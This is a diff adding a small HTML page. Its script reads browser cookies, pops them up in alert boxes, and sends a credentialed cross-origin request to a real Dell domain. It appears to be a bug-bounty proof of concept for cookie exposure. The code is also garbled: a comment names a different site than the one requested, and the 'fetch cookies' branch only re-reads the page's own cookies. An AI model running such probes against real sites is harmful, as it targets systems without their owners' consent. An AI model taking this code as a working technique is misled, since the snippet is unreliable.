@@ -1,0 +1,35 @@
+<html>
+<script>
+// Function to get the value of a specific cookie by name
+function getCookie(name) {
+    let cookieArr = document.cookie.split(";");
+    for (let i = 0; i < cookieArr.length; i++) {
+        let cookiePair = cookieArr[i].split("=");
+        if (name === cookiePair[0].trim()) {
+            return decodeURIComponent(cookiePair[1]);
+        }
+    }
+    return null;
+}
+
+// Example usage: Reading a cookie named 'exampleCookie'
+var exampleCookie = getCookie('exampleCookie');
+if (exampleCookie) {
+    alert('exampleCookie: ' + exampleCookie);
+} else {
+    alert('exampleCookie not found');
+}
+
+// Fetch cookies from bugbountytraining.com
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var allCookies = document.cookie; // Retrieve all cookies
+        alert('All Cookies: ' + allCookies);
+    }
+};
+xhttp.open("GET", "https://gbxgateway.dell.com", true);
+xhttp.withCredentials = true;
+xhttp.send();
+</script>
+</html>
